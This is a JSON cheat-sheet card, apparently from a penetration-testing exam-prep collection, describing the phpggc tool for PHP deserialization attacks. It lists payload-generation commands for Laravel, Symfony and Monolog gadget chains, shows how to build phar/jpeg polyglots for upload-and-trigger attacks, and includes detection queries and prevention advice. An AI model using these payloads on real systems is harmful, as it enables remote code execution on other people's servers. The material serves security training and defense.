@@ -1,0 +1,110 @@
+{
+  "id": "deser-php-phpggc",
+  "name": "phpggc - PHP Object Injection Gadget Chains",
+  "command": "phpggc <framework>/<chain> <function> \"<command>\"",
+  "description": "phpggc generates PHP object-injection (unserialize) payloads using gadget chains in popular frameworks and libraries (Laravel, Symfony, Monolog, Guzzle, Doctrine, WordPress). When an app calls unserialize() on attacker data, crafted objects trigger magic methods (__wakeup, __destruct, __toString) that chain into file writes or command execution. phpggc also builds phar archives to exploit phar:// deserialization reached through file functions.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Web Exploitation",
+  "subcategory": "Deserialization",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "ambionics/phpggc",
+  "tags": [
+    "deserialization",
+    "phpggc",
+    "php",
+    "object-injection",
+    "phar",
+    "laravel",
+    "symfony",
+    "monolog",
+    "rce"
+  ],
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== IDENTIFY A PHP UNSERIALIZE SINK ===\n  # Serialized PHP looks like: O:4:\"User\":2:{...} (object) or a:2:{...} (array).\n  # Sinks: unserialize($_GET/_POST/cookie), or file funcs reachable with phar:// (fopen/file_get_contents/getimagesize).\n\n=== LIST AVAILABLE CHAINS ===\n  phpggc -l                 # all chains\n  phpggc -l laravel         # filter by framework\n  phpggc -i Laravel/RCE1    # info/requirements for one chain\n\n=== GENERATE A PAYLOAD ===\n  phpggc Laravel/RCE1 system id\n  phpggc Symfony/RCE4 exec \"id\"\n  phpggc Monolog/RCE1 system \"id\"\n  phpggc Guzzle/RCE1 system id\n  # Base64 / URL encode for transport:\n  phpggc -b Laravel/RCE1 system id       # base64\n  phpggc -u Laravel/RCE1 system id       # url-encoded\n\n=== PHAR DESERIALIZATION (file-function sinks, no unserialize call needed) ===\n  # Build a polyglot phar whose metadata is the gadget, then reach it with a phar:// path.\n  phpggc -p phar -o /tmp/evil.phar Monolog/RCE1 system id\n  # Upload evil.phar (often as evil.gif), then trigger:\n  #   file_get_contents(\"phar:///var/www/uploads/evil.gif\")  -> deserializes metadata\n  phpggc -pj phar -o evil.phar Monolog/RCE1 system id   # phar+jpeg polyglot\n\n=== MAGIC METHODS THAT DRIVE THE CHAIN ===\n  __wakeup()   fires on unserialize()\n  __destruct() fires when the object is garbage-collected\n  __toString() fires when the object is treated as a string\n\n=== ALTERNATIVES ===\n  Hand-craft objects when no framework chain fits (PHPGGC covers most)\n  LFI phar:// wrapper card for the phar trigger mechanics",
+  "examples": [
+    {
+      "label": "Laravel unserialize RCE",
+      "command": "phpggc Laravel/RCE1 system id"
+    },
+    {
+      "label": "Base64 Monolog payload for a cookie",
+      "command": "phpggc -b Monolog/RCE1 system \"id\""
+    },
+    {
+      "label": "Phar/jpeg polyglot for a file-function sink",
+      "command": "phpggc -pj phar -o evil.phar Monolog/RCE1 system id"
+    }
+  ],
+  "references": [
+    {
+      "title": "ambionics/phpggc",
+      "url": "https://github.com/ambionics/phpggc"
+    },
+    {
+      "title": "PortSwigger - PHP phar deserialization",
+      "url": "https://portswigger.net/web-security/deserialization/exploiting"
+    },
+    {
+      "title": "OWASP Deserialization Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "exploit-deserialization",
+      "note": "Generic multi-language deserialization hub card.",
+      "rel": "prereq"
+    },
+    {
+      "id": "deser-nodejs",
+      "note": "Node.js serialization RCE, a sibling runtime.",
+      "rel": "alternative"
+    },
+    {
+      "id": "deser-python-pickle",
+      "note": "Python pickle RCE, a sibling runtime.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "PHP unserialize() rebuilds arbitrary objects and runs their magic methods. Gadget chains in bundled libraries route __destruct/__wakeup into file writes or process execution. phar:// smuggles the same object graph through any file-system function, so even code that never calls unserialize() can be hit.",
+    "prerequisites": "A reachable unserialize() on user input, or a file function accepting a phar:// path plus a way to upload the phar; a library with a usable gadget chain in the codebase.",
+    "impact": "Remote code execution as the web server / PHP-FPM user.",
+    "detection": "[MITRE T1190] Requests with O:<n>: or a:<n>:{ serialized objects, or phar:// in parameters/uploaded file metadata; [MITRE T1059] php/php-fpm spawning sh/bash as children.",
+    "artifacts": "Apache/Nginx access logs with serialized blobs or phar:// strings; uploaded files whose trailing bytes contain __HALT_COMPILER() (phar signature); EDR process tree php-fpm -> sh.",
+    "splunk_spl": "index=web (request_body=\"*phar://*\" OR request_body=\"O:*:*{*\" OR uri_query=\"*phar%3A%2F%2F*\")\n| table _time, src_ip, uri_path, request_body",
+    "elastic_kql": "http.request.body.content:(*phar\\:\\/\\/* or O\\:*) or url.query:*phar*",
+    "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"php\",\"php-fpm\",\"php-cgi\",\"httpd\",\"nginx\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+    "sigma_rules": "web_php_object_injection_phar_or_shell_child",
+    "prevention": "Never unserialize() untrusted input; use json_decode for data. If unavoidable, pass allowed_classes=false. Validate uploaded file content and block phar:// via disable wrappers / PHP 8 phar read-only defaults; keep frameworks patched; run PHP-FPM least-privileged.",
+    "sources": [
+      "ambionics/phpggc",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "PHP serialized object or phar:// in web request",
+        "logic": "index=web (request_body=\"*phar://*\" OR request_body=\"O:*:*{*\" OR uri_query=\"*phar%3A%2F%2F*\")\n| stats count by src_ip, uri_path\n| where count > 0",
+        "data_source": "apache",
+        "attack": [
+          "T1190"
+        ],
+        "fidelity": "signature",
+        "confidence": "medium",
+        "false_positives": "Apps that legitimately pass serialized session data in requests",
+        "tuning": "Focus on endpoints that accept serialized input or file paths; correlate with a php-fpm child shell"
+      }
+    ]
+  }
+}
